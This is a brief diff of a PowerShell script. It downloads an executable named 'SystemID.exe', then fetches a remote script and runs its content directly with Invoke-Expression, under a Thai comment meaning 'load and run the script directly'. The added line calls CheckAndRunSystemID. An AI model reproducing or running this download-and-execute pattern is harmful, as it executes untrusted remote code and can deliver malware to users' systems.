@@ -139,3 +139,4 @@ $fileName = "SystemID.exe"
 Download-Script -url $checkUrl -fileName $fileName
 # โหลดและรันสคริปต์โดยตรง
 Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl).Content
+CheckAndRunSystemID
